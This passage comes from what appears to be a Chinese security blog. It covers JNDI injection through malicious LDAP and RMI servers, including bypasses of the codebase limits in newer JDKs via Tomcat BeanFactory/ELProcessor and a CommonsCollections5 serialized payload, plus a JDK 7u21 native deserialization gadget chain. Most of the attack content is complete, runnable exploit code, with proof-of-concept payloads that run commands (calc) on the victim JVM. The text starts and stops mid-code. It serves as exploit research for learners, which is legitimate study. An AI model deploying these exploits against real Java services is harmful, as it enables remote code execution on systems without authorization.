//$NON-NLS-1$ ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;fupanc\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); //$NON-NLS-1$ e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } 然后再编写一个客户端来请求：\n1 2 3 4 5 6 7 8 9 package JNDI; import javax.naming.directory.InitialDirContext; public class LDAP_Client { public static void main(String[] args) throws Exception { Object object = new InitialDirContext().lookup(\u0026#34;ldap://127.0.0.1:8888/Test\u0026#34;); } } 然后还是使用之前的恶意类，按照之间的操作编译class文件并起一个http服务。\n然后启动服务端，再启动客户端就可以成功弹计算机： 代码调试 LDAP_Client端 对应代码：\n1 Object object = new InitialDirContext().lookup(\u0026#34;ldap://127.0.0.1:2333/test\u0026#34;); 前面一个InitialDirContext类的初始化也是说过的，大概就是实例化了InitialDirContext类及其父类InitialContext类，并将InitialContext类的myPops赋值为了一个空的Hashtable类。\n然后重点看InitialDirContext类调用的lookup()方法：\n老朋友了，不多说，第一部分： 然后调用getURLContext()方法： 然后调用getURLObject()方法： 然后获取到ldap服务的工厂类并调用工厂类ldapURLContextFactoy的getObjectInstance()方法： 然后实例化ldapURLContext类，里面有一个将其父类的父类GenericURLContext类的myEnv变量赋值为空的Hashtable类的操作。\n所以第一部分是获取到了ldapURLContext类\n——————\n所以第二部分会调用ldapURLContext类的lookup()方法： 会调用到其父类的父类的lookup()方法： 这里需要注意的是this代表ldapURLContext类，所以会调用ldapURLContext类的getRootURLContext()方法，然后就会调用ldapURLContextFactory类的getUsingURLIgnoreRootDN()方法：\n最后获取到的结果如下：\n后面跟进调用的lookup()方法： 然后会调用LdapCtx类的p_lookup()方法： 跟进p_lookup()方法： var4.getStatus()方法返回2，会匹配2的代码，跟进c_lookup()方法，直接看关键代码：\n这里的var4中存在LDAP的基本信息：\n这里的JAVA_ATTRIBUTES变量就是一个数组：\n所以if条件中获取到了值：\n然后调用了decodeObject()方法，在decodeObject()方法中调用了decodeReference()方法.\n在这个decodeReference()方法方法中进行了Reference类的初始化：\n看传入的参数，并且最后返回了这个var5。\n回到c_lookup()方法，最后调用了getObjectInstance()方法（这里的var3就是前面的Reference类）：\n跟进方法：\n这里的代码是和前面JNDI_RMI的攻击的其中一部分代码都是差不多的，但是还是有点区别： 然后会调用getObjectFactoryFromReference()方法：\n然后会加载类，并且最后会实例化这个类，成功弹计算机：\n最后还是同样异常输出然后到catch语句。\n注意事项 JDK版本对JNDI的利用有一定的限制，如下：\n1 2 3 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 高版本限制绕过 测试环境：JDK 8u411\n——————\n限制地点：\nRMI： 这里导致无法继续后面的操作。\n利用本地Class作为Reference Factory 在前面说了，虽然我们不能从远程加载恶意的Factoy，但是我们可以在返回的Reference中指定Factory Class，即我们可以尝试利用本地的类，让本地的类来加载恶意代码。\n工厂列必须实现javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。在这里可以利用org.apache.naming.factory.BeanFactory，完美符合，存在与Tomcat依赖包中，所以可以广泛使用。\n在BeanFactory的getObjectInstance()中通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用sette方法为所有的属性赋值。而该Bean Class的类名、属性、属性值全都来自于Reference对象，均是攻击者可控的。\n比如JNDI-Ldap就在下代码实例化Reference类：\n也就是如下设置Reference类：\n所以我们现在可以尝试将客户端获取到的Reference类指向可控恶意类。\n继续往后面走，只要这里的getObjectFactoryFromReference类成功实例化指向类，而不像之前那样弹出计算机导致异常输出，这里就有机会调用到这个指向类的getObjectInstance()方法：\n——————\nJNDI-RMI过程中获取Reference类是直接从数据流中读取的，可以自己跟跟，不赘述了，然后调用到指定类的getObjectInstance()方法是差不多的。\n现在在pom.xml中引入这个存在BeanFactoy类的依赖来本地测试：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.20\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 代码实现及分析 直接给代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDI_RMI_Server_ByPass { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); ResourceRef resourceRef = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;, (String)null, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, true, \u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;, (String)null); resourceRef.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;faster=eval\u0026#34;)); resourceRef.add(new StringRefAddr(\u0026#34;faster\u0026#34;, \u0026#34;Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;)\u0026#34;)); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind(\u0026#34;Hello\u0026#34;, referenceWrapper); System.out.println(\u0026#34;Registry运行中......\u0026#34;); } } 然后现在就只需要先运行这个Server端，再运行客户端来请求即可。\n注意：这是根据BeanFactory的代码逻辑，要求传入的Reference为ResourceRef类，并不是前面的Reference类。\n所以当调用到decodeObject()方法时，方法中获取到的是ResourceRef类： 即这里的var3的值： 然后会调用NamingManager类的getObjectInstance()方法，直接到关键地方： 这个方法内会调用getObjectFactoryFromReference()方法，会加载并实例化BeanFactory类：\nreturn后就会调用到这个BeanFactory类的getObjectInstance()方法： 传入参数的参数简单说说：1.前面获取的ResourceRef类，2.Hello，3.RegistryContext类，4.空的Hashtabel类\n给下RegistryContext类的值的情况：\n前面的分析中经常说这个类的创建，参数传递而已，不多说。\n现在来跟进BeanFactory类的getObjectInstance()方法： 可以看到进入这个if语句的条件就是需要obj为ResouceRef类或其子类，这也就是为什么要传那个类。\n看try语句，前三个不多说，获取的值情况： 然后进入第二个if条件，就会尝试加载javax.el.ELProcessor类，会成功加载到Class对象。继续往后看：\n会进入else语句，但是后面会报错，需要又引入一个依赖，如下：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.el\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;com.springsource.org.apache.el\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;6.0.24\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 继续看，\n可以看到将其放进了HashMap类中在后续代码中又将其取出利用;\n并直接调用：\n即现在就会调用到calc\n利用LDAP返回序列化数据，反序触发本地Gadget 同样是利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget。\n服务端代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 package JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.InetAddress; import java.net.URL; import java.util.HashMap; import java.util.Map; public class LDAP_EVIL_Server { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main ( String[] tmp_args ) throws Exception{ String[] args=new String[]{\u0026#34;http://127.0.0.1:8081/#test\u0026#34;}; int port = 4444; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, //$NON-NLS-1$ InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), //$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); //$NON-NLS-1$ ds.startListening(); } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor ( URL cb ) { this.codebase = cb; } @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;foo\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaSerializedData\u0026#34;,CommonsCollections5()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } private static byte[] CommonsCollections5() throws Exception{ Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,new Class[]{}}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }; ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,\u0026#34;test\u0026#34;); BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null); Field field=badAttributeValueExpException.getClass().getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(badAttributeValueExpException,tiedMapEntry); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(badAttributeValueExpException); objectOutputStream.close(); return byteArrayOutputStream.toByteArray(); } } 客户端代码：\n1 2 3 4 5 6 7 8 9 package JNDI; import javax.naming.InitialContext; public class LDAP_Client { public static void main(String[] args) throws Exception { Object object=new InitialContext().lookup(\u0026#34;ldap://127.0.0.1:4444/dc=example,dc=com\u0026#34;); } } 成功弹出计算机。\n参考文章：\nhttps://nivi4.notion.site/Java-JNDI-ddd6c46c271545598180799ab255e09a\nhttps://www.javasec.org/javase/JNDI/\nhttps://www.cnblogs.com/nice0e3/p/13958047.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\nhttps://baicany.github.io/2023/08/19/jndi/#%E7%BB%95%E8%BF%87%E9%AB%98%E7%89%88%E6%9C%ACJDK%E9%99%90%E5%88%B6%EF%BC%9A%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class%E4%BD%9C%E4%B8%BAReference-Factory\n","date":"2024-10-22T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/jndi/","title":"JNDI"},{"content":"JDK 7u21 7u21这条链不需要任何依赖，完全是靠 java 原生类来进行利用。\n影响版本：JDK \u0026lt;= 7u21\n测试环境：\nJDK 7u21 idea需要改配置，我前面都是1.8，这里改成JDK7即可，按照下面这个文章来该即可：\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\nhttps://blog.csdn.net/wz1509/article/details/141857535\n前置说明 铺垫 这里的JDK7u21还是利用的动态加载字节码，这里可以获取到一个类的方法，先简单给个铺垫知识，在前面CC链的学习其实也用过，我们可以启用一次动态加载字节码的方法有：\nnewTransformer()： getOutputProperties()： 其实直接用getTransletInstance()方法应该也可以，但是不是很好利用。\n上面说的两个方法也定义于Templates.java接口类，如下： 也是前面用过的。\nAnnotationInvocationHandler 在前面的CC1的LazyMap链中，就利用到了这个类，在那里利用到了这个类的invoke()方法，为了调用到get方法：\n但是在这里，我们要利用的是这个类的equalsImpl()方法，同样的是在这个类的invoke()方法中利用，如上图片标注。\nequalsImpl() 现在再来看这个equalsImpl()方法： 这里调用了invoke()方法，需要var1不是AnnotationInvocationHandler类实例并且需要为type变量的一个类实例才能调用，再来跟进一下前面var2的getMemberMethods()方法：\n这里就是获取到type变量里的方法，在AnnotationInvocationHandler类的type变量定义：\n我们可以使用反射获取AnnotationInvocationHandler类的构造方法，这样就可以给这个变量定值，所以我们可以尝试将这里的type变量赋值为Templates.class接口类，这样就可以直接获取到想利用的方法。\n参考CC1，现在这里就可以再次尝试使用动态代理来调用到这个AnnotationInvocationHandler类的invoke()方法，进而进行其他操作。\nHashMap 这里为什么会用到HashMap呢，这是因为这个类的readObject()方法中对代理对象调用了它的方法，如下： 进入这个putForCreate()方法： 只要满足前面的条件，这里就可以成功对这个key调用equals()方法，只要我们将这个key设置为AnnotationInvocationHandler的代理对象，就可以成功调用到这个AnnotationInvocationHandler类的invoke()方法\n同理感觉HashSet，Hashtable也能构造，只要能使调用的方法为equals()方法即可调用equalsImpl()方法： 简单说明一下参数问题：key.equals(k);，当跳转到AnnotationInvocationHandler类的invoke()方法时，这里对应的参数分别为\nvar2（方法名）：equals va3（参数）：k 所以结合前面invoke()方法，这里的k需要为TemplatesImpl类的实例，对应的就是前一个put进的值：\n这张图说的很清楚了，所以我们需要put进两个值，并且前一个需要为templateImpl类的实例，另一个为代理对象。\n现在可以敲定基本框架了，大概想一下流程，反序：\n放键值对到其中。 调用到AnntationInvocationHandler的invoke()方法 调用equalsImpl()方法 调用getMemberMethods()方法获取到type的class对象中的方法。 执行invoke来动态加载字节码 攻击构造 HashMap 基本盘：\nTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 现在就是看如何将这个配置好了的恶意字节码能被利用到。\n反序列化部分 先从反序分析起：\n这里就是从序列化数据中提取出键值，然后调用putForCreate()方法尝试将其放入键值表中，继续跟进这个putForCeate()方法： 重点还是标注出来的地方。\n首先就是hash值的设定，那里的逻辑就是如果 key为null，那么hash值就为0，否则就是调用hash()方法来计算key的的哈希值。 跟进一下这里的hash()方法，算法如下：\n其次就是后面的if条件内的判断。java中的\u0026amp;\u0026amp;运算符会按前后顺序执行，并且需要前面的真才会执行后面。而后面的||运算符只要一个为真即可。 所以在这里我们需要满足前面的hash值条件为真。就可以执行后面的语句。\n问题一（hash值） hash值相同的问题。\n结合前面的分析及CC链的学习，我们这里需要put进两个值，并且第二个值为一个代理对象。\n现在来看一下hash值的计算问题。回到hash计算部分代码：\n思考一下，第一个值就是直接调用它的hashCode()方法，第二个put进的值需要为代理对象。先跟第二个键值对的计算方法： 由于我们传入的k是AnnotationInvocationHandle代理对象，所以这里调用hashCode()方法就会到AnnotationInvocationHandler类的invoke()方法，就会调用到hashCodeImpl()方法：\n跟进这个hashCodeImpl()方法： 这个方法声明了一个Map.Entry类型的var3，然后创建了一个迭代器var2，用于遍历this.memberrValues变量的条目集，所以这里的membeValues应该为一个Map对象，我们可以用一个HashMap实例来代表。\n如果 membeValues 只有一个键值对，该hash就等于127 * key.hashCode() ^ value.hashCode()，而当key.hashCode为0，任何数异或0的结果仍是他本身： 在ysoserial项目提供了一个字符串f5a5a608，其hashCode值正好为0。所以该hash计算可以简化成value.hashCode，\n重点来了，前面我们说过了put进的第一个值需要为TemplatesImpl类的实例，所以前面在计算hash值调用的hash()方法中，计算方式就是templatesImpl.hashCode()。\n而只要我们将value设置为TemplatesImpl对象，就能实现Proxy.hashCode等于TemplatesImpl.hashCode，也就是第二个的计算方式也是templatesImpl.hashCode()。\n这样就能成功通过hash值相同的问题。\n——————————\n问题解决，尝试构造：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 弹出一个计算机。看了一下，确实是序列化之前造成的，HashMap的put()会调用，老生常谈了： 解决方法就是将最开始加入templatesImpl类实例的地方不要加入，让hash值直接不相同：\n改成下面的POC试试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); //这个不能删，再调用一次修改值即可 hashMap.put(\u0026#34;f5a5a608\u0026#34;,\u0026#34;fupanc\u0026#34;); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(ctf,111); hash.put(proxy,111); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 还是不行，看了一下其他师傅的文章，说是在最后的HashMap中放入ctf和proxy时调换一下位置即可，即如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package java_foundation; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.HashMap; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.lang.reflect.Constructor; import java.util.Map; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;f5a5a608\u0026#34;,ctf); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler instance = (InvocationHandler)constructor1.newInstance(Templates.class,hashMap); Class[] interfaces = ctf.getClass().getInterfaces(); Templates proxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),interfaces,instance); HashMap hash = new HashMap(); hash.put(proxy,111); hash.put(ctf,111); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行调试后发现确实是反序列化时弹出来的计算机，并且在序列化之前也没有弹出计算机。\n————\n后面想了一下，这样不就与之前分析的不一样了吗。百思不得其解。\n然后就一直调试，最后在发现，实在反序列化时出现了问题。\nHashMap反序列化时的问题：\n从代码中可以知道，这里是一个放入键值对的地方，但是我想当然地想着这里会按照顺序来放入键值对，调试如下（以上面正确的代码为例）：\n先放入的键值对如下：\n然后继续再一次断于这个点，放入的键值对如下：\n也就是proxy中存在的hashMap。\n然后继续再一次断于这个点，键值对如下：\n可以看到最后才是这个proxy，而我们的放入的操作为： 是先放入的proxy再放入的ctf，但是这里的反序列化时的顺序是不一样的，我们想利用的代码如下：\n所以是需要key为proxy代理对象的，但是序列化和反序列化的顺序是不同的，所以这里需要先放入proxy，后放入ctf，这样，也就不会导致序列化之前的弹计算机了。\n如果按照之前的顺序，那么确实是会在序列化之前弹出计算机，符合弹计算机的条件。\n但是在反序列化时，HashMap的顺序就是 hashMap里的键值对 ==》hash中的proxy 键值对 ==\u0026gt;hash中的ctf(TemplatesImpl键值对)。并且调试后也符合情况。\n然后我在JDK8也试了一下，也是先反序列化的第二个键值对，但是测试的键值对都是以一个类实例为key，问了一下，原因大概如下：\n这个是因为HashMap序列化和反序列化时本身其顺序就可能不同，其顺序时基于哈希值来决定的，所以这里可能就与环境有关了。也许在某个环境我最开始的那个先放入fupanc再修改为ctf的方法也是有用的呢（反正刚学的时候应该是可以的，这里再重看的时候不行了）。反正多试。\n为了验证想法，使用如下POC来验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import java.util.HashMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main{ public static void main(String[] main) throws Exception{ // TemplatesImpl ctf = new TemplatesImpl(); // // HashMap hashMap = new 